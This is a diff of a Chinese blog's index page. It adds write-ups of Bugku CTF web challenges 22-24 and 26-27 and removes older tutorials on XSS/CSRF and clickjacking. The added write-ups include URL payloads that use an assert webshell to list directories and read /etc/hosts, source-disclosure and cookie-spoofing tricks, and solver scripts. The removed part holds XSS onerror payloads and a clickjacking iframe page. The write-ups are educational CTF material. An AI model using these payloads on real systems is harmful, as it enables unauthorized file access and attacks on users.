@@ -336,7 +336,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/bugku-17-20/">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/19/bugku-26-27/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wr">
@@ -356,7 +356,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2019/03/14/bugku-17-20/" class="post-title-link" itemprop="url">bugku 17-20</a>
+                <a href="/2019/03/19/bugku-26-27/" class="post-title-link" itemprop="url">bugku 26-27 writeup(web)</a>
               
             
           </h1>
@@ -381,12 +381,498 @@
                 
               
 
-              <time title="创建时间：2019-03-14 16:09:36 / 修改时间：16:13:29" itemprop="dateCreated datePublished" datetime="2019-03-14T16:09:36+08:00">2019-03-14</time>
+              <time title="创建时间：2019-03-19 20:12:05 / 修改时间：20:21:30" itemprop="dateCreated datePublished" datetime="2019-03-19T20:12:05+08:00">2019-03-19</time>
             
 
             
               
 
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、第26题（过狗一句话）"><a href="#一、第26题（过狗一句话）" class="headerlink" title="一、第26题（过狗一句话）"></a>一、第26题（过狗一句话）</h2><p><img src="/2019/03/19/bugku-26-27/1.jpg" alt="在这里插入图片描述"><br>打开链接发现一篇空白，抓包也没什么发现。那么我们只能分析上面那段代码了<br>explode()函数就是把<code>$poc</code>变量用#号来分割开来。那么<code>$poc_2</code>就是assert,他和最后一句代码构造成了assert()函数,assert函数功能跟eval类似，可以把里面的内容当作代码来执行。</p>
+<p>那么我们构造payload为<code>?s=print_r(scandir(&#39;./&#39;))</code>，扫描出描本级目录下的文件。（这其实是一种xss攻击）<br><img src="/2019/03/19/bugku-26-27/2.jpg" alt="在这里插入图片描述"><br>发现了flag_sm1skla1.txt文件。访问该文件即可得出flag<br><img src="/2019/03/19/bugku-26-27/3.jpg" alt="在这里插入图片描述"><br>拓展：<br>我们扫描上级目录</p>
+<pre><code>http://123.206.87.240:8010/?s=print_r(scandir(%27../%27))
+</code></pre><p><img src="/2019/03/19/bugku-26-27/6.jpg" alt="在这里插入图片描述"><br>根据目录结构应该是linux系统，hosts文件应该在etc里面</p>
+<pre><code>http://123.206.87.240:8010/?s=print_r(readfile(%27../etc/hosts%27))
+</code></pre><p><img src="/2019/03/19/bugku-26-27/4.jpg" alt="在这里插入图片描述"></p>
+<h2 id="一、第27题（字符？正则？）"><a href="#一、第27题（字符？正则？）" class="headerlink" title="一、第27题（字符？正则？）"></a>一、第27题（字符？正则？）</h2><p>打开题目，是一段代码</p>
+<pre><code> &lt;?php 
+highlight_file(&apos;2.php&apos;);
+$key=&apos;KEY{********************************}&apos;;
+$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+if( $IM ){ 
+  die(&apos;key is: &apos;.$key);
+}
+?&gt; 
+</code></pre><p>分析这段代码可以发现，只要我们构造出一个符号条件的KEY作为参数传入即可得到flag,突然发现我的正则学了和没学一样。</p>
+<p>这边先介绍下</p>
+<p><strong>preg_match — 执行一个正则表达式匹配</strong></p>
+<pre><code>preg_match ( $pattern , $subject , $matches )
+</code></pre><p>搜索subject与pattern给定的正则表达式的一个匹配.</p>
+<p>参数 ：</p>
+<p>pattern : 要搜索的模式，字符串类型(正则表达式)。<br>subject : 输入的字符串。<br>matches :（可有可无）如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</p>
+<p>返回值 ：</p>
+<p>preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
+<pre><code>实例1：
+
+$label = &apos;content/112&apos;;
+$a = preg_match(&apos;#content/(\d+)#i&apos;, $label, $mc);
+var_dump($a);
+var_dump($mc);
+输出：
+
+int(1)
+array(2) {
+ [0]=&gt;
+ string(11) &quot;content/112&quot;
+ [1]=&gt;
+ string(3) &quot;112&quot;
+}
+</code></pre><p><strong>开始分析下题目中的正则表达式</strong><br>定界符：/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
+<pre><code>. （一个点）：表示可以匹配任何字符；
+
+*   ：前面的字符重复零次或多次；
+
+{n,m} ：最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符;
+
+\ （反斜线）：后面的字符被转义；
+
+[a-z] ：在a到z中匹配 ；
+
+[[:punct:]] ：匹配任何标点符号；
+
+/i  ：表示这个正则表达式对大小写不敏感；
+</code></pre><p>我们构造<code>id=keykeyaaaakey:/a/keyz;</code><br><img src="/2019/03/19/bugku-26-27/5.jpg" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/19/bugku-22-24/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/19/bugku-22-24/" class="post-title-link" itemprop="url">bugku 22-24 write up（web）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-19 20:07:29 / 修改时间：20:11:28" itemprop="dateCreated datePublished" datetime="2019-03-19T20:07:29+08:00">2019-03-19</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、第22题（速度要快"><a href="#一、第22题（速度要快" class="headerlink" title="一、第22题（速度要快)"></a>一、第22题（速度要快)</h2><p>首先我们查看源码</p>
+<pre><code>&lt;/br&gt;我感觉你得快点!!!&lt;!-- OK ,now you have to post the margin what you find --&gt;
+</code></pre><p>发现有post需要提交，参数为marign</p>
+<p>那么我们开始抓包，<br><img src="/2019/03/19/bugku-22-24/1.jpg" alt="在这里插入图片描述"><br>然后发现是base64编码的flag,解码后，输入flag,发现flag错误。<br>额，我们再次抓包，发现flag又变化了。怪得题目说我觉得你得快点。<br>我有尝试了几次发现还是不行，看来只能借助python脚本了</p>
+<pre><code>import requests
+import base64
+url = &apos;http://123.206.87.240:8002/web6/&apos;
+s = requests.session()
+flag = s.get(url).headers[&apos;flag&apos;]  # flag在响应头里
+
+ #为了下面使用split不报错，ba64decode操作的对象是byte类型的字符串，而split函数要用str类型
+flag = base64.b64decode(flag).decode()
+
+flag = base64.b64decode(flag.split(&quot;:&quot;)[1]).decode()  # 获取flag后的值
+payload = {&apos;margin&apos;: flag}
+print(s.post(url, data = payload).text)  # post方法上传
+</code></pre><p><strong>python中str是经过编好码的字符串，如unicode,gb2312,ascii编码，可以表示不同语言中的字符，可以解码成byte<br>byte是字节，只能是ascii码0-255的字符，表示未经编码处理的原始字符串</strong></p>
+<p><a href="http://www.runoob.com/python/att-string-split.html" target="_blank" rel="noopener">split函数</a>简单的介绍</p>
+<p>str与byte的简单的转化方法：</p>
+<pre><code>flag=flag.decode()//byte转为str
+flag=flag.encode()//str转为byte
+</code></pre><h2 id="二、第23题（cookie欺骗）"><a href="#二、第23题（cookie欺骗）" class="headerlink" title="二、第23题（cookie欺骗）"></a>二、第23题（cookie欺骗）</h2><p><a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a><br>打开题目发现，filename参数后面是一串base64编码，进行解码得keys.txt.<br>我们把index.php进行base64编码后放在filename参数的后面，进行输入</p>
+<pre><code>http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw
+</code></pre><p>改变line后面的数字即可一行一行的输出index.php的内容<br>这样子太慢了，我们写个python脚本来实现。</p>
+<pre><code>import requests
+def getHTMLText(url):
+    try:
+        r = requests.get(url,timeout=30)
+        r.raise_for_status()
+        r .encoding = r.apparent_encoding
+        return r.text
+    except:
+        return&quot;产生异常&quot;
+if __name__==&quot;__main__&quot;:
+    a=30
+    for i in range(a):
+        url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot;
+        print(getHTMLText(url))
+</code></pre><p>输出index.php的网页源码</p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+
+$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);
+
+$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;
+
+if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);
+
+$file_list = array(
+
+&apos;0&apos; =&gt;&apos;keys.txt&apos;,
+
+&apos;1&apos; =&gt;&apos;index.php&apos;,
+
+);
+</code></pre><p>​<br>    if(isset($_COOKIE[‘margin’]) &amp;&amp; $_COOKIE[‘margin’]==’margin’){</p>
+<pre><code>$file_list[2]=&apos;keys.php&apos;;
+
+}
+
+if(in_array($file, $file_list)){
+
+$fa = file($file);
+
+echo $fa[$line];
+
+}
+
+?&gt;
+</code></pre><p>这段代码的意思是flag在keys.php文件里，我们需要传入cookie:margin=margin才可以看到源码。<br><img src="/2019/03/19/bugku-22-24/2.jpg" alt="在这里插入图片描述"><br>进行操作后发现是空白，我们查看源码发现了flag<br><img src="/2019/03/19/bugku-22-24/3.jpg" alt="在这里插入图片描述"></p>
+<h2 id="三、第24题（never-give-up）"><a href="#三、第24题（never-give-up）" class="headerlink" title="三、第24题（never give up）"></a>三、第24题（never give up）</h2><p>查看源码发现<br><img src="/2019/03/19/bugku-22-24/4.jpg" alt="在这里插入图片描述"><br>那么我们访问<code>http://123.206.87.240:8006/test/1p.html</code><br>发现是bugku的主页，被重定向了。<br>那么我们使用</p>
+<pre><code>view-source:http://123.206.87.240:8006/test/1p.htm
+</code></pre><p>直接访问源码，发现源码中有一部分被url编码了，那么我们进行解码，发现是base64编码，再解码发现是url编码，那么我们再解码，终于得出了以下关键的部分</p>
+<pre><code>&quot;;if(!$_GET[&apos;id&apos;])
+{
+    header(&apos;Location: hello.php?id=1&apos;);
+    exit();
+}
+$id=$_GET[&apos;id&apos;];
+$a=$_GET[&apos;a&apos;];
+$b=$_GET[&apos;b&apos;];
+if(stripos($a,&apos;.&apos;))
+{
+    echo &apos;no no no no no no no&apos;;
+    return ;
+}
+$data = @file_get_contents($a,&apos;r&apos;);
+if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+{
+    require(&quot;f4l2a3g.txt&quot;);
+}
+else
+{
+    print &quot;never never never give up !!!&quot;;
+}
+</code></pre><p>​<br>    ?&gt;</p>
+<p>看下这部分源码发现有很多要求才可以看到flag,那么尝试下直接访问</p>
+<pre><code>http://123.206.87.240:8006/test/f4l2a3g.txt
+</code></pre><p>看到flag了。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/bugku-17-20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/14/bugku-17-20/" class="post-title-link" itemprop="url">bugku 17-20 write up（web）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-14 16:09:36" itemprop="dateCreated datePublished" datetime="2019-03-14T16:09:36+08:00">2019-03-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-19 20:08:58" itemprop="dateModified" datetime="2019-03-19T20:08:58+08:00">2019-03-19</time>
               
             
           </span>
@@ -1777,438 +2263,11 @@ flag变量又在$GLOBALS中，var_dump  eval  成功得到flag
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/06/xss1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/06/xss1/" class="post-title-link" itemprop="url">XSS和CSRF之介绍</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-06 21:41:37 / 修改时间：21:47:06" itemprop="dateCreated datePublished" datetime="2019-03-06T21:41:37+08:00">2019-03-06</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、什么是XSS"><a href="#一、什么是XSS" class="headerlink" title="一、什么是XSS"></a>一、什么是XSS</h2><p>全称：Cross Site Script<br>中文名称：跨站脚本<br>危害：盗取用户信息、钓鱼、制造蠕虫等</p>
-<p>概念：<br><img src="/2019/03/06/xss1/1.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、xss的分类"><a href="#二、xss的分类" class="headerlink" title="二、xss的分类"></a>二、xss的分类</h2><p><strong>1、存储型</strong><br>访问网站时，触发XSS<br>我们可以通过查看网页源代码的方式查看xss的触发点。</p>
-<p>我们安装irebug（F12快捷件打开），利用该火狐插件来寻找注入点。</p>
-<p>分析其攻击过程<br><img src="/2019/03/06/xss1/2.jpg" alt><br>但是xss脚本是怎样被黑客写入数据库呢<br><img src="/2019/03/06/xss1/3.jpg" alt="在这里插入图片描述"><br><strong>2、反射型</strong><br>访问携带xss脚本的连接时触发xss</p>
-<p>查看源码，寻找触发点</p>
-<p>如何产生的呢（右边为xss源码）<br><img src="/2019/03/06/xss1/4.jpg" alt="在这里插入图片描述"><br>分析攻击过程<br><img src="/2019/03/06/xss1/5.jpg" alt="在这里插入图片描述"></p>
-<p><strong>存储型xss和反射型xss的区别</strong><br>存储型xss是从数据库中提取xss的脚本内容<br>反射型xss是直接从url的内容中提取出xss的脚本的内容</p>
-<p><strong>3、DOM型</strong><br>那什么是DOM呢，就是Document Object Model,即文档对象模型，它允许脚本（js）控制web的页面、窗口和文档。简单说DOM就是就是js操作html时的API(应用程序接口)</p>
-<p>访问携带xss脚本的连接时触发xss</p>
-<p>查看源码，了解触发点</p>
-<p>分析原理<br><img src="/2019/03/06/xss1/6.jpg" alt="在这里插入图片描述"></p>
-<p><strong>DOM型xss与反射型xss很类似，但是他们有什么区别呢</strong><br>DOM型xss是通过前端javascript将xss脚本写入DOM中，触发xss</p>
-<p>反射型xss是通过后端或应用程序将xss脚本写入响应页面中，浏览器响应页面时才触发xss</p>
-<p><strong>存储型xss漏洞演示</strong></p>
-<p><img src="/2019/03/06/xss1/7.jpg" alt="在这里插入图片描述"><br>xss代码应该为<code>&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;</code>，<br>用管理员员登入后台，进入留言板会触发xss,出现弹窗内容为/xxxx/</p>
-<p><strong>反射型xss漏洞演示</strong><br>我们写一个这样的脚本文件，命名为index.php</p>
-<pre><code>&lt;?php 
-header(&quot;content-type:text/html;charset=utf-8&quot;);
-if(isset($_REQUEST[&quot;name&quot;]))
-{
-     $name=$_REQUEST[&quot;name&quot;];
-}
-else{
-  $name = &quot;&quot;;
-}
-echo &quot;hhhhh &quot;.$name;
-?&gt;
-</code></pre><p>本地访问下<br><img src="/2019/03/06/xss1/8.jpg" alt="在这里插入图片描述"><br>传入参数<code>？name=&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;</code><br>alert（）方法用于显示一条指定的消息和一个ok按钮的警告框<br>用qq浏览器尝试下，xss注入被浏览器拦截了，尴尬了<br><img src="/2019/03/06/xss1/9.jpg" alt="在这里插入图片描述"></p>
-<p>用火狐浏览器再次尝试，成功注入xss<br><img src="/2019/03/06/xss1/10.jpg" alt="在这里插入图片描述"><br>查看源码即可发现注入位置<br><img src="https://img-blog.csdnimg.cn/20190304112014875.png" alt="在这里插入图片描述"><br>DOM型xss漏洞这边就不演示了</p>
-<p><strong>4、小结</strong><br><img src="/2019/03/06/xss1/11.jpg" alt="在这里插入图片描述"></p>
-<h2 id="三、CSRF是什么"><a href="#三、CSRF是什么" class="headerlink" title="三、CSRF是什么"></a>三、CSRF是什么</h2><p><strong>全称</strong>：Cross-site request forgery</p>
-<p><strong>中文名称是：</strong>跨站请求伪造</p>
-<p><strong>危害</strong>：执行恶意操作（”被转账“、“被发垃圾评论”等）、制造蠕虫·······</p>
-<p><strong>概念：</strong>利用客户已经登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作</p>
-<p><strong>分析原理</strong><br><img src="/2019/03/06/xss1/12.jpg" alt="在这里插入图片描述"><br><strong>那里面恶意的网站是怎么做的呢？</strong></p>
-<p>正常情况下：<br>通常Cookie中会存放用户凭证信息<br>浏览器在发送任何请求时都会带上已有的cookie<br>通过cookie识别用户身份后，执行转账操作。</p>
-<p>黑客的操作：<br>伪造攻击代码，打开页面时自动完成转账<br><img src="/2019/03/06/xss1/13.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/06/Clickjacking/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/06/Clickjacking/" class="post-title-link" itemprop="url">Clickjacking(点击劫持)</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-06 21:37:23 / 修改时间：21:40:49" itemprop="dateCreated datePublished" datetime="2019-03-06T21:37:23+08:00">2019-03-06</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><p>首先介绍下html下的iframe标签的作用：<br>可以创建包含另一个文档的内联框架。<br>例如下面这个代码。运行下面这个网页，发现他和网易安全中心的页面几乎一样，除了url不一样</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;
-&lt;head&gt;
-    &lt;title&gt;网易安全中心&lt;/title&gt;
-    &lt;style &gt;
-        html,body,iframe{
-            display: block;
-            height: 100%;
-            width: 100%;
-            margin: 0;
-            padding: 0;    
-            border: none;    
-        }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p><img src="/2019/03/06/Clickjacking/1.jpg" alt="在这里插入图片描述"><br>案例，图片的背后是隐藏的网站。<br><img src="/2019/03/06/Clickjacking/2.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、什么是点击劫持呢"><a href="#二、什么是点击劫持呢" class="headerlink" title="二、什么是点击劫持呢"></a>二、什么是点击劫持呢</h2><p>通过覆盖不可见的框架误导受害者点击而造成的攻击行为。</p>
-<h2 id="三、点击劫持的特点"><a href="#三、点击劫持的特点" class="headerlink" title="三、点击劫持的特点"></a>三、点击劫持的特点</h2><p>1、隐蔽性高</p>
-<p>2、骗取用户操作</p>
-<p>3、UI-覆盖攻击</p>
-<p>4、利用了iframe标签或者其他标签的属性</p>
-<h2 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h2><p>代码如下，效果如下</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;
-&lt;head&gt;
-    &lt;title&gt;点击劫持&lt;/title&gt;
-    &lt;style &gt;
-    /*设置高度、宽度*/
-        html,body,iframe{
-                display: block;
-                height: 100%;
-                width: 100%;
-                margin: 0;
-                padding: 0;    
-                border: none;
-                }
-    /*设置隐藏网页的可见度*/
-        iframe{
-            /*opacity: 0;*/
-            filter: alpha(opacity=0);/*IE*/
-            -moz-opacity:0.5;/*Moz+FF*/
-            opacity: 0.5;/*支持css3浏览器（FF1.5也支持）*/
-            position: absolute;
-            z-index: 2;/*网页的堆叠层次*/
-        }
-    /*设置按钮的位置*/
-        button{
-            position: absolute;
-            top: -70px;
-            left: 800px;
-            z-index: 1;
-            width: 72px;
-            height: 26px;
-        }    
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;button&gt;&lt;img src=&quot;3.jpg&quot;&gt;&lt;/button&gt;
-    &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p><img src="/2019/03/06/Clickjacking/3.jpg" alt="在这里插入图片描述"><br>再做次修改<br><img src="/2019/03/06/Clickjacking/4.jpg" alt="在这里插入图片描述"><br>效果，以及完全看不出背后的网易网页了。<br><img src="/2019/03/06/Clickjacking/5.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -2253,7 +2312,7 @@ echo &quot;hhhhh &quot;.$name;
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-count">21</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
